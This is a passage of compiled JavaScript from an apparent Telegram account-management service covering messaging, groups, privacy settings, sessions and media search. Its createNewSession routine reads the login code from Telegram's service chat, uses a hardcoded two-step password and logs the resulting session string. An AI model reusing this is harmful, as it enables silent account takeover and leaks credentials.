                    id: result.photos
                }));
            }
            this.logger.info(this.phoneNumber, "Deleted profile Photos");
        }
        catch (error) {
            throw error;
        }
    }
    async createNewSession() {
        const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Session creation timed out after 1 minute')), 1 * 60 * 1000));
        const sessionPromise = (async () => {
            const me = await this.client.getMe();
            this.logger.info(this.phoneNumber, "Creating new session for: ", me.phone);
            const newClient = new telegram_1.TelegramClient(new sessions_1.StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, await (0, generateTGConfig_1.generateTGConfig)(this.phoneNumber));
            this.logger.info(this.phoneNumber, "Starting Session Creation...");
            await newClient.start({
                phoneNumber: me.phone,
                password: async () => "Ajtdmwajt1@",
                phoneCode: async () => {
                    this.logger.info(this.phoneNumber, 'Waiting for the OTP code from chat ID 777000...');
                    return await this.waitForOtp();
                },
                onError: (err) => { throw err; },
            });
            this.logger.info(this.phoneNumber, "Session Creation Completed");
            const session = newClient.session.save();
            await newClient.destroy();
            this.logger.info(this.phoneNumber, "New Session: ", session);
            return session;
        })();
        return Promise.race([sessionPromise, timeoutPromise]);
    }
    async waitForOtp() {
        for (let i = 0; i < 3; i++) {
            try {
                this.logger.info(this.phoneNumber, "Attempt : ", i);
                const messages = await this.client.getMessages('777000', { limit: 1 });
                const message = messages[0];
                if (message && message.date && message.date * 1000 > Date.now() - 60000) {
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    this.logger.info(this.phoneNumber, "returning: ", code);
                    return code;
                }
                else {
                    this.logger.info(this.phoneNumber, `Message Date: ${new Date(message.date * 1000).toISOString()} Now: ${new Date(Date.now() - 60000).toISOString()}`);
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    this.logger.info(this.phoneNumber, "Skipped Code: ", code);
                    if (i == 2) {
                        return code;
                    }
                    await (0, Helpers_1.sleep)(5000);
                }
            }
            catch (err) {
                await (0, Helpers_1.sleep)(2000);
                this.logger.info(this.phoneNumber, err);
            }
        }
    }
    async createGroupWithOptions(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.createGroupOrChannel(options);
        let channelId;
        if ('updates' in result) {
            const updates = Array.isArray(result.updates) ? result.updates : [result.updates];
            const channelUpdate = updates.find(u => u instanceof telegram_1.Api.UpdateChannel);
            if (channelUpdate && 'channelId' in channelUpdate) {
                channelId = channelUpdate.channelId;
            }
        }
        if (!channelId) {
            throw new Error('Failed to create channel');
        }
        const channel = await this.client.getEntity(channelId);
        if (!(channel instanceof telegram_1.Api.Channel)) {
            throw new Error('Created entity is not a channel');
        }
        if (options.members?.length) {
            const users = await Promise.all(options.members.map(member => this.client.getInputEntity(member)));
            await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
                channel: await this.client.getInputEntity(channel),
                users
            }));
        }
        if (options.photo) {
            const buffer = await this.downloadFileFromUrl(options.photo);
            const inputFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
                workers: 1
            });
            await this.client.invoke(new telegram_1.Api.channels.EditPhoto({
                channel: await this.client.getInputEntity(channel),
                photo: new telegram_1.Api.InputChatUploadedPhoto({
                    file: inputFile
                })
            }));
        }
        return channel;
    }
    async updateGroupSettings(settings) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getEntity(settings.groupId);
        if (settings.title) {
            await this.client.invoke(new telegram_1.Api.channels.EditTitle({
                channel: channel,
                title: settings.title || ''
            }));
        }
        ;
        if (settings.description) {
            await this.client.invoke(new telegram_1.Api.messages.EditChatAbout({
                peer: channel,
                about: settings.description
            }));
        }
        if (settings.username) {
            await this.client.invoke(new telegram_1.Api.channels.UpdateUsername({
                channel: channel,
                username: settings.username
            }));
        }
        if (settings.slowMode !== undefined) {
            await this.client.invoke(new telegram_1.Api.channels.ToggleSlowMode({
                channel: channel,
                seconds: settings.slowMode
            }));
        }
        return true;
    }
    async scheduleMessageSend(opts) {
        if (!this.client)
            throw new Error('Client not initialized');
        const scheduleDate = Math.floor(opts.scheduledTime.getTime() / 1000);
        if (opts.media) {
            const buffer = await this.downloadFileFromUrl(opts.media.url);
            const uploadedFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile('media', buffer.length, 'media', buffer),
                workers: 1
            });
            return this.client.sendFile(opts.chatId, {
                file: uploadedFile,
                caption: opts.message,
                forceDocument: opts.media.type === 'document',
                scheduleDate
            });
        }
        return this.client.sendMessage(opts.chatId, {
            message: opts.message,
            schedule: Math.floor(opts.scheduledTime.getTime() / 1000)
        });
    }
    async getScheduledMessages(chatId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.client.invoke(new telegram_1.Api.messages.GetScheduledHistory({
            peer: chatId,
            hash: (0, big_integer_1.default)(0)
        }));
        return 'messages' in result && Array.isArray(result.messages)
            ? result.messages.filter(msg => msg instanceof telegram_1.Api.Message)
            : [];
    }
    async sendMediaAlbum(album) {
        if (!this.client)
            throw new Error('Client not initialized');
        const results = [];
        const errors = [];
        for (let i = 0; i < album.media.length; i++) {
            const item = album.media[i];
            try {
                const buffer = await this.downloadFileFromUrl(item.url);
                const uploadedFile = await this.client.uploadFile({
                    file: new uploads_1.CustomFile(item.filename || `media_${i}`, buffer.length, item.filename || `media_${i}`, buffer),
                    workers: 1
                });
                const media = new telegram_1.Api.InputSingleMedia({
                    media: item.type === 'photo'
                        ? new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile })
                        : new telegram_1.Api.InputMediaUploadedDocument({
                            file: uploadedFile,
                            mimeType: item.type === 'video' ? 'video/mp4' : this.detectContentType(item.filename || `media_${i}`),
                            attributes: item.type === 'video' ? [
                                new telegram_1.Api.DocumentAttributeVideo({
                                    supportsStreaming: true,
                                    duration: 0,
                                    w: 0,
                                    h: 0
                                })
                            ] : []
                        }),
                    message: item.caption || '',
                    entities: []
                });
                results.push(media);
            }
            catch (error) {
                this.logger.error(this.phoneNumber, `Error processing album item ${i}:`, error);
                errors.push({
                    index: i,
                    error: error.message || 'Unknown error'
                });
            }
        }
        if (results.length === 0) {
            throw new Error('No media items could be processed. All items failed.');
        }
        const sendResult = await this.client.invoke(new telegram_1.Api.messages.SendMultiMedia({
            peer: album.chatId,
            multiMedia: results
        }));
        return {
            ...sendResult,
            success: results.length,
            failed: errors.length,
            errors: errors.length > 0 ? errors : undefined
        };
    }
    async sendMessage(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const { peer, parseMode, message } = params;
        return await this.client.sendMessage(peer, { message, parseMode });
    }
    async sendVoiceMessage(voice) {
        if (!this.client)
            throw new Error('Client not initialized');
        try {
            const buffer = await this.downloadFileFromUrl(voice.url);
            return await this.client.invoke(new telegram_1.Api.messages.SendMedia({
                peer: voice.chatId,
                media: new telegram_1.Api.InputMediaUploadedDocument({
                    file: await this.client.uploadFile({
                        file: new uploads_1.CustomFile('voice.ogg', buffer.length, 'voice.ogg', buffer),
                        workers: 1
                    }),
                    mimeType: 'audio/ogg',
                    attributes: [
                        new telegram_1.Api.DocumentAttributeAudio({
                            voice: true,
                            duration: voice.duration || 0
                        })
                    ]
                }),
                message: voice.caption || '',
                randomId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000000))
            }));
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error sending voice message:', error);
            throw error;
        }
    }
    async cleanupChat(cleanup) {
        if (!this.client)
            throw new Error('Client not initialized');
        cleanup.revoke = cleanup.revoke !== undefined ? cleanup.revoke : true;
        const messages = await this.client.getMessages(cleanup.chatId, {
            limit: 1000,
            ...(cleanup.beforeDate && {
                offsetDate: Math.floor(cleanup.beforeDate.getTime() / 1000)
            })
        });
        const toDelete = messages.filter(msg => {
            if (cleanup.excludePinned && msg.pinned)
                return false;
            if (cleanup.onlyMedia && !msg.media)
                return false;
            return true;
        });
        if (toDelete.length > 0) {
            await this.client.deleteMessages(cleanup.chatId, toDelete.map(m => m.id), {
                revoke: cleanup.revoke
            });
        }
        return { deletedCount: toDelete.length };
    }
    async updatePrivacyBatch(settings) {
        if (!this.client)
            throw new Error('Client not initialized');
        const privacyRules = {
            everybody: [new telegram_1.Api.InputPrivacyValueAllowAll()],
            contacts: [new telegram_1.Api.InputPrivacyValueAllowContacts()],
            nobody: [new telegram_1.Api.InputPrivacyValueDisallowAll()]
        };
        const updates = [];
        const privacyMap = {
            phoneNumber: telegram_1.Api.InputPrivacyKeyPhoneNumber,
            lastSeen: telegram_1.Api.InputPrivacyKeyStatusTimestamp,
            profilePhotos: telegram_1.Api.InputPrivacyKeyProfilePhoto,
            forwards: telegram_1.Api.InputPrivacyKeyForwards,
            calls: telegram_1.Api.InputPrivacyKeyPhoneCall,
            groups: telegram_1.Api.InputPrivacyKeyChatInvite
        };
        for (const [key, value] of Object.entries(settings)) {
            if (value && key in privacyMap) {
                updates.push(this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                    key: new privacyMap[key](),
                    rules: privacyRules[value]
                })));
            }
        }
        await Promise.all(updates);
        return true;
    }
    async getSessionInfo() {
        if (!this.client)
            throw new Error('Client not initialized');
        const [authorizationsResult, devicesResult] = await Promise.all([
            this.client.invoke(new telegram_1.Api.account.GetAuthorizations()),
            this.client.invoke(new telegram_1.Api.account.GetWebAuthorizations())
        ]);
        const sessions = authorizationsResult.authorizations.map(auth => ({
            hash: auth.hash.toString(),
            deviceModel: auth.deviceModel,
            platform: auth.platform,
            systemVersion: auth.systemVersion,
            appName: auth.appName,
            dateCreated: new Date(auth.dateCreated * 1000),
            dateActive: new Date(auth.dateActive * 1000),
            ip: auth.ip,
            country: auth.country,
            region: auth.region
        }));
        const webSessions = devicesResult.authorizations.map(auth => ({
            hash: auth.hash.toString(),
            domain: auth.domain,
            browser: auth.browser,
            platform: auth.platform,
            dateCreated: new Date(auth.dateCreated * 1000),
            dateActive: new Date(auth.dateActive * 1000),
            ip: auth.ip,
            region: auth.region
        }));
        return {
            sessions,
            webSessions
        };
    }
    async terminateSession(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        if (options.exceptCurrent) {
            if (options.type === 'app') {
                await this.client.invoke(new telegram_1.Api.auth.ResetAuthorizations());
            }
            else {
                await this.client.invoke(new telegram_1.Api.account.ResetWebAuthorizations());
            }
            return true;
        }
        if (options.type === 'app') {
            await this.client.invoke(new telegram_1.Api.account.ResetAuthorization({
                hash: (0, big_integer_1.default)(options.hash)
            }));
        }
        else {
            await this.client.invoke(new telegram_1.Api.account.ResetWebAuthorization({
                hash: (0, big_integer_1.default)(options.hash)
            }));
        }
        return true;
    }
    async getChatStatistics(chatId, period) {
        if (!this.client)
            throw new Error('Client not initialized');
        const now = Math.floor(Date.now() / 1000);
        const periodInSeconds = {
            day: 24 * 60 * 60,
            week: 7 * 24 * 60 * 60,
            month: 30 * 24 * 60 * 60
        }[period];
        const messages = await this.client.getMessages(chatId, {
            limit: 100,
            offsetDate: now - periodInSeconds
        });
        const stats = {
            period,
            totalMessages: messages.length,
            uniqueSenders: new Set(messages.map(m => m.fromId?.toString()).filter(Boolean)).size,
            messageTypes: {
                text: messages.filter(m => !m.media && m.message).length,
                photo: messages.filter(m => m.media && m.media.className === 'MessageMediaPhoto').length,
                video: messages.filter(m => {
                    if (!m.media || m.media.className !== 'MessageMediaDocument')
                        return false;
                    const doc = m.media.document;
                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('video/');
                }).length,
                voice: messages.filter(m => {
                    if (!m.media || m.media.className !== 'MessageMediaDocument')
                        return false;
                    const doc = m.media.document;
                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('audio/');
                }).length,
                other: messages.filter(m => m.media && !['MessageMediaPhoto', 'MessageMediaDocument'].includes(m.media.className)).length
            },
            topSenders: Object.entries(messages.reduce((acc, msg) => {
                const senderId = msg.fromId?.toString();
                if (senderId) {
                    acc[senderId] = (acc[senderId] || 0) + 1;
                }
                return acc;
            }, {}))
                .sort(([, a], [, b]) => b - a)
                .slice(0, 10)
                .map(([id, count]) => ({ id, count })),
            mostActiveHours: Object.entries(messages.reduce((acc, msg) => {
                const hour = new Date(msg.date * 1000).getHours();
                acc[hour] = (acc[hour] || 0) + 1;
                return acc;
            }, {}))
                .sort(([, a], [, b]) => b - a)
                .map(([hour, count]) => ({ hour: Number(hour), count }))
        };
        return stats;
    }
    getMediaExtension(media) {
        if (!media)
            return 'bin';
        switch (media.className) {
            case 'MessageMediaPhoto':
                return 'jpg';
            case 'MessageMediaDocument':
                const doc = media.document;
                if (!doc || !('mimeType' in doc))
                    return 'bin';
                const mime = doc.mimeType;
                if (mime?.startsWith('video/'))
                    return 'mp4';
                if (mime?.startsWith('image/'))
                    return mime.split('/')[1];
                if (mime?.startsWith('audio/'))
                    return 'ogg';
                return 'bin';
            default:
                return 'bin';
        }
    }
    getSearchFilter(filter) {
        switch (filter) {
            case 'photo': return new telegram_1.Api.InputMessagesFilterPhotos();
            case 'video': return new telegram_1.Api.InputMessagesFilterVideo();
            case 'document': return new telegram_1.Api.InputMessagesFilterDocument();
            case 'url': return new telegram_1.Api.InputMessagesFilterUrl();
            case 'roundVideo': return new telegram_1.Api.InputMessagesFilterRoundVideo();
            case 'phtotoVideo': return new telegram_1.Api.InputMessagesFilterPhotoVideo();
            case 'voice': return new telegram_1.Api.InputMessagesFilterVoice();
            case 'roundVoice': return new telegram_1.Api.InputMessagesFilterRoundVoice();
            case 'gif': return new telegram_1.Api.InputMessagesFilterGif();
            case 'sticker': return new telegram_1.Api.InputMessagesFilterDocument();
            case 'animation': return new telegram_1.Api.InputMessagesFilterDocument();
            case 'music': return new telegram_1.Api.InputMessagesFilterMusic();
            case 'chatPhoto': return new telegram_1.Api.InputMessagesFilterChatPhotos();
            case 'location': return new telegram_1.Api.InputMessagesFilterGeo();
            case 'contact': return new telegram_1.Api.InputMessagesFilterContacts();
            case 'chatPhoto': return new telegram_1.Api.InputMessagesFilterChatPhotos();
            case 'phoneCalls': return new telegram_1.Api.InputMessagesFilterPhoneCalls({ missed: false });
            default: return new telegram_1.Api.InputMessagesFilterEmpty();
        }
    }
    getMediaType(media) {
        if (media instanceof telegram_1.Api.MessageMediaPhoto) {
            return 'photo';
        }
        else if (media instanceof telegram_1.Api.MessageMediaDocument) {
            const document = media.document;
            if (document.attributes.some(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo)) {
                return 'video';
            }
            return 'document';
        }
        return 'document';
    }
    getEntityId(entity) {
        if (entity instanceof telegram_1.Api.User)
            return entity.id.toString();
        if (entity instanceof telegram_1.Api.Channel)
            return entity.id.toString();
        if (entity instanceof telegram_1.Api.Chat)
            return entity.id.toString();
        return '';
    }
    async addGroupMembers(groupId, members) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const users = await Promise.all(members.map(member => this.client.getInputEntity(member)));
        await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
            channel: channel,
            users
        }));
    }
    async removeGroupMembers(groupId, members) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        for (const member of members) {
            const user = await this.client.getInputEntity(member);
            await this.client.invoke(new telegram_1.Api.channels.EditBanned({
                channel: channel,
                participant: user,
                bannedRights: new telegram_1.Api.ChatBannedRights({
                    untilDate: 0,
                    viewMessages: true,
                    sendMessages: true,
                    sendMedia: true,
                    sendStickers: true,
                    sendGifs: true,
                    sendGames: true,
                    sendInline: true,
                    embedLinks: true
                })
            }));
        }
    }
    async promoteToAdmin(groupId, userId, permissions, rank) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);
        await this.client.invoke(new telegram_1.Api.channels.EditAdmin({
            channel: channel,
            userId: user,
            adminRights: new telegram_1.Api.ChatAdminRights({
                changeInfo: permissions?.changeInfo ?? false,
                postMessages: permissions?.postMessages ?? false,
                editMessages: permissions?.editMessages ?? false,
                deleteMessages: permissions?.deleteMessages ?? false,
                banUsers: permissions?.banUsers ?? false,
                inviteUsers: permissions?.inviteUsers ?? true,
                pinMessages: permissions?.pinMessages ?? false,
                addAdmins: permissions?.addAdmins ?? false,
                anonymous: permissions?.anonymous ?? false,
                manageCall: permissions?.manageCall ?? false,
                other: false
            }),
            rank: rank || ''
        }));
    }
    async demoteAdmin(groupId, userId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);
        await this.client.invoke(new telegram_1.Api.channels.EditAdmin({
            channel: channel,
            userId: user,
            adminRights: new telegram_1.Api.ChatAdminRights({
                changeInfo: false,
                postMessages: false,
                editMessages: false,
                deleteMessages: false,
                banUsers: false,
                inviteUsers: false,
                pinMessages: false,
                addAdmins: false,
                anonymous: false,
                manageCall: false,
                other: false
            }),
            rank: ''
        }));
    }
    async unblockGroupUser(groupId, userId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);
        await this.client.invoke(new telegram_1.Api.channels.EditBanned({
            channel: channel,
            participant: user,
            bannedRights: new telegram_1.Api.ChatBannedRights({
                untilDate: 0,
                viewMessages: false,
                sendMessages: false,
                sendMedia: false,
                sendStickers: false,
                sendGifs: false,
                sendGames: false,
                sendInline: false,
                embedLinks: false
            })
        }));
    }
    async getGroupAdmins(groupId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
            channel: await this.client.getInputEntity(groupId),
            filter: new telegram_1.Api.ChannelParticipantsAdmins(),
            offset: 0,
            limit: 100,
            hash: (0, big_integer_1.default)(0)
        }));
        if ('users' in result) {
            const participants = result.participants;
            const users = result.users;
            return participants.map(participant => {
                const adminRights = participant.adminRights;
                return {
                    userId: participant.userId.toString(),
                    rank: participant.rank || '',
                    permissions: {
                        changeInfo: adminRights.changeInfo || false,
                        postMessages: adminRights.postMessages || false,
                        editMessages: adminRights.editMessages || false,
                        deleteMessages: adminRights.deleteMessages || false,
                        banUsers: adminRights.banUsers || false,
                        inviteUsers: adminRights.inviteUsers || false,
                        pinMessages: adminRights.pinMessages || false,
                        addAdmins: adminRights.addAdmins || false,
                        anonymous: adminRights.anonymous || false,
                        manageCall: adminRights.manageCall || false
                    }
                };
            });
        }
        return [];
    }
    async getGroupBannedUsers(groupId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
            channel: await this.client.getInputEntity(groupId),
            filter: new telegram_1.Api.ChannelParticipantsBanned({ q: '' }),
            offset: 0,
            limit: 100,
            hash: (0, big_integer_1.default)(0)
        }));
        if ('users' in result) {
            const participants = result.participants;
            return participants.map(participant => {
                const bannedRights = participant.bannedRights;
                return {
                    userId: participant.peer.chatId.toString(),
                    bannedRights: {
                        viewMessages: bannedRights.viewMessages || false,
                        sendMessages: bannedRights.sendMessages || false,
                        sendMedia: bannedRights.sendMedia || false,
                        sendStickers: bannedRights.sendStickers || false,
                        sendGifs: bannedRights.sendGifs || false,
                        sendGames: bannedRights.sendGames || false,
                        sendInline: bannedRights.sendInline || false,
                        embedLinks: bannedRights.embedLinks || false,
                        untilDate: bannedRights.untilDate || 0
                    }
                };
            });
        }
        return [];
    }
    async searchMessages(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const finalResult = {
            video: { messages: [], total: 0 },
            photo: { messages: [], total: 0 },
            document: { messages: [], total: 0 },
            voice: { messages: [], total: 0 },
            text: { messages: [], total: 0 },
            all: { messages: [], total: 0 },
            roundVideo: { messages: [], total: 0 },
            roundVoice: { messages: [], total: 0 },
        };
        const { chatId, query = '', types, maxId, minId, limit } = params;
        this.logger.info(this.phoneNumber, "Types: ", types);
        for (const type of types) {
            const filter = this.getSearchFilter(type);
            const queryFilter = {
                limit: limit || 500,
                ...(maxId ? { maxId } : {}),
                ...(minId ? { minId } : {}),
            };
            this.logger.info(this.phoneNumber, type, queryFilter);
            const searchQuery = {
                q: query,
                filter: filter,
                ...queryFilter,
                hash: (0, big_integer_1.default)(0),
            };
            let messages = [];
            let count = 0;
            this.logger.info(this.phoneNumber, "Search Query: ", searchQuery);
            if (chatId) {
                searchQuery['peer'] = await this.safeGetEntity(chatId);
                this.logger.info(this.phoneNumber, "Performing search in chat: ", chatId);
                const result = await this.client.invoke(new telegram_1.Api.messages.Search(searchQuery));
                if (!('messages' in result)) {
                    return {};
                }
                this.logger.info(this.phoneNumber, `Type: ${type}, Length: ${result?.messages?.length}, count: ${result["count"]}`);
                count = result["count"] || 0;
                messages = result.messages;
            }
            else {
                this.logger.info(this.phoneNumber, "Performing global search");
                const result = await this.client.invoke(new telegram_1.Api.messages.SearchGlobal({
                    ...searchQuery,
                    offsetRate: 0,
                    offsetPeer: new telegram_1.Api.InputPeerEmpty(),
                    offsetId: 0,
                    usersOnly: true
                }));
                if (!('messages' in result)) {
                    return {};
                }
                this.logger.info(this.phoneNumber, `Type: ${type}, Length: ${result?.messages?.length}, count: ${result["count"]}`);
                count = result["count"] || 0;
                messages = result.messages;
            }
            if (types.includes(message_search_dto_1.MessageMediaType.TEXT) && types.length === 1) {
                this.logger.info(this.phoneNumber, "Text Filter");
                messages = messages.filter((msg) => !('media' in msg));
            }
            const processedMessages = await Promise.all(messages.map(async (message) => {
                const unwantedTexts = [
                    'movie', 'series', 'tv show', 'anime', 'x264', 'aac', '720p', '1080p', 'dvd',
                    'paidgirl', 'join', 'game', 'free', 'download', 'torrent', 'link', 'invite',
                    'invite link', 'invitation', 'invitation link', 'customers', 'confirmation', 'earn', 'book', 'paper', 'pay',
                    'qr', 'invest', 'tera', 'disk', 'insta', 'mkv', 'sub', '480p', 'hevc', 'x265', 'bluray',
                    'mdisk', 'diskwala', 'tera', 'online', 'watch', 'click', 'episode', 'season', 'part', 'action',
                    'adventure', 'comedy', 'drama', 'fantasy', 'horror', 'mystery', 'romance', 'sci-fi', 'thriller',
                    'demo', 'dress', 'netlify', 'service', 'follow', 'like', 'comment', 'share', 'subscribe',
                    'premium', 'premium', 'unlock', 'access', 'exclusive', 'limited', 'offer', 'deal',
                    'discount', 'sale', 'free trial', 'free access', 'free download', 'free gift', 'freebie',
                    'crypto', 'currency', 'coin', 'blockchain', 'wallet', 'exchange', 'trading', 'investment',
                ];
                if (message.media && message.media instanceof telegram_1.Api.MessageMediaDocument) {
                    const document = message.media.document;
                    const fileNameAttr = document.attributes.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
                    const fileName = fileNameAttr && fileNameAttr instanceof telegram_1.Api.DocumentAttributeFilename ? fileNameAttr.fileName : '';
                    const fileNameText = fileName.toLowerCase();
                    const isWantedFile = !(0, utils_1.contains)(fileNameText, unwantedTexts);
                    return isWantedFile ? message.id : null;
                }
                else {
                    const messageText = (message.text || '').toLowerCase();
                    const containsFilteredContent = (0, utils_1.contains)(messageText, unwantedTexts);
                    return !containsFilteredContent ? message.id : null;
                }
            }));
            const filteredMessages = processedMessages.filter(id => id !== null);
            const localResult = {
                messages: filteredMessages,
                total: count ? count : filteredMessages.length
            };
            finalResult[`${type}`] = localResult;
        }
        return finalResult;
    }
    async getAllMediaMetaData(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        let { chatId, types = ['all'], startDate, endDate, maxId, minId } = params;
        const hasAll = types.includes('all');
        const typesToFetch = hasAll
            ? ['photo', 'video', 'document', 'voice']
            : types.filter(t => t !== 'all');
        let allMedia = [];
        let hasMore = true;
        let lastOffsetId = 0;
        const limit = 200;
        while (hasMore) {
            const response = await this.getMediaMetadata({
                chatId,
                types: hasAll ? ['all'] : typesToFetch,
                startDate,
                endDate,
                limit,
                maxId: lastOffsetId > 0 ? lastOffsetId : undefined,
                minId
            });
            this.logger.info(this.phoneNumber, `hasMore: ${response.pagination.hasMore}, Total: ${response.pagination.total}, nextMaxId: ${response.pagination.nextMaxId}`);
            if (response.groups) {
                const items = response.groups.flatMap(group => group.items || []);
                allMedia = allMedia.concat(items);
            }
            else if (response.data) {
                allMedia = allMedia.concat(response.data);
            }
            if (!response.pagination.hasMore || !response.pagination.nextMaxId) {
                hasMore = false;
                this.logger.info(this.phoneNumber, 'No more messages to fetch');
            }
            else {
                lastOffsetId = response.pagination.nextMaxId;
                this.logger.info(this.phoneNumber, `Fetched ${allMedia.length} messages so far`);
            }
            await (0, Helpers_1.sleep)(3000);
        }
        if (hasAll) {
            const grouped = allMedia.reduce((acc, item) => {
                if (!acc[item.type]) {
                    acc[item.type] = [];
                }
                acc[item.type].push(item);
                return acc;
            }, {});
            const groups = typesToFetch.map(mediaType => ({
                type: mediaType,
                count: grouped[mediaType]?.length || 0,
                items: grouped[mediaType] || [],
                pagination: {
                    page: 1,
                    limit: grouped[mediaType]?.length || 0,
                    total: grouped[mediaType]?.length || 0,
                    totalPages: 1,
                    hasMore: false
                }
            }));
            return {
                groups,
                pagination: {
                    page: 1,
                    limit: allMedia.length,
                    total: allMedia.length,
                    totalPages: 1,
                    hasMore: false
                },
                filters: {
                    chatId,
                    types: ['all'],
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        }
        else {
            return {
                data: allMedia,
                pagination: {
                    page: 1,
                    limit: allMedia.length,
                    total: allMedia.length,
                    totalPages: 1,
                    hasMore: false
                },
                filters: {
                    chatId,
                    types: typesToFetch,
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        }
    }
    async getFilteredMedia(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        let { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;
        const hasAll = types.includes('all');
        const typesToFetch = hasAll
            ? ['photo', 'video', 'document', 'voice']
            : types.filter(t => t !== 'all');
        const queryLimit = hasAll ? (limit || 50) * typesToFetch.length : (limit || 50);
        const query = {
            limit: queryLimit,
            ...(maxId ? { maxId } : {}),
            ...(minId ? { minId } : {}),
            ...(startDate && startDate instanceof Date && !isNaN(startDate.getTime()) && {
                minDate: Math.floor(startDate.getTime() / 1000)
            }),
            ...(endDate && endDate instanceof Date && !isNaN(endDate.getTime()) && {
                maxDate: Math.floor(endDate.getTime() / 1000)
            })
        };
        const ent = await this.safeGetEntity(chatId);
        this.logger.info(this.phoneNumber, "getFilteredMedia", params);
        const messages = await this.client.getMessages(ent, query);
        this.logger.info(this.phoneNumber, `Fetched ${messages.length} messages`);
        const filteredMessages = messages.filter(message => {
            if (!message.media)
                return false;
            const mediaType = this.getMediaType(message.media);
            return typesToFetch.includes(mediaType);
        });
        this.logger.info(this.phoneNumber, `Filtered down to ${filteredMessages.length} messages`);
        const mediaData = await this.processWithConcurrencyLimit(filteredMessages, async (message) => {
            const thumbBuffer = await this.getThumbnailBuffer(message);
            const mediaDetails = this.getMediaDetails(message.media);
            let fileSize;
            let mimeType;
            let filename;
            let width;
            let height;
            let duration;
            if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                const photo = message.photo;
                mimeType = 'image/jpeg';
                filename = 'photo.jpg';
                if (photo?.sizes && photo.sizes.length > 0) {
                    const largestSize = photo.sizes[photo.sizes.length - 1];
                    if (largestSize && 'size' in largestSize) {
                        fileSize = largestSize.size;
                    }
                    if (largestSize && 'w' in largestSize) {
                        width = largestSize.w;
                    }
                    if (largestSize && 'h' in largestSize) {
                        height = largestSize.h;
                    }
                }
            }
            else if (message.media instanceof telegram_1.Api.MessageMediaDocument) {
                const doc = message.media.document;
                if (doc instanceof telegram_1.Api.Document) {
                    fileSize = typeof doc.size === 'number' ? doc.size : (doc.size ? Number(doc.size.toString()) : undefined);
                    mimeType = doc.mimeType;
                    const fileNameAttr = doc.attributes?.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
                    filename = fileNameAttr?.fileName;
                    const videoAttr = doc.attributes?.find(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo);
                    if (videoAttr) {
                        width = videoAttr.w;
                        height = videoAttr.h;
                        duration = videoAttr.duration;
                    }
                    const audioAttr = doc.attributes?.find(attr => attr instanceof telegram_1.Api.DocumentAttributeAudio);
                    if (audioAttr && !duration) {
                        duration = audioAttr.duration;
                    }
                }
            }
            let dateValue;
            const msgDate = message.date;
            if (msgDate) {
                if (typeof msgDate === 'number') {
                    dateValue = msgDate;
                }
                else if (typeof msgDate === 'object' && msgDate !== null && 'getTime' in msgDate) {
                    const dateObj = msgDate;
                    dateValue = Math.floor(dateObj.getTime() / 1000);
                }
                else {
                    dateValue = Math.floor(Date.now() / 1000);
                }
            }
            else {
                dateValue = Math.floor(Date.now() / 1000);
            }
            return {
                messageId: message.id,
                chatId: chatId,
                type: this.getMediaType(message.media),
                date: dateValue,
                caption: message.message || '',
                thumbnail: thumbBuffer ? `data:image/jpeg;base64,${thumbBuffer.toString('base64')}` : undefined,
                fileSize,
                mimeType,
                filename,
                width,
                height,
                duration,
                mediaDetails: mediaDetails || undefined
            };
        }, this.THUMBNAIL_CONCURRENCY_LIMIT, this.THUMBNAIL_BATCH_DELAY_MS);
        if (hasAll) {
            const grouped = mediaData.reduce((acc, item) => {
                if (!acc[item.type]) {
                    acc[item.type] = [];
                }
                acc[item.type].push(item);
                return acc;
            }, {});
            const groups = typesToFetch.map(mediaType => {
                const items = (grouped[mediaType] || []).slice(0, limit);
                const typeTotal = items.length;
                const typeHasMore = grouped[mediaType]?.length > limit;
                const typeFirstMessageId = items.length > 0 ? items[0].messageId : undefined;
                const typeLastMessageId = items.length > 0 ? items[items.length - 1].messageId : undefined;
                const typeNextMaxId = typeHasMore ? typeLastMessageId : undefined;
                return {
                    type: mediaType,
                    count: typeTotal,
                    items: items,
                    pagination: {
                        page: 1,
                        limit,
                        total: typeTotal,
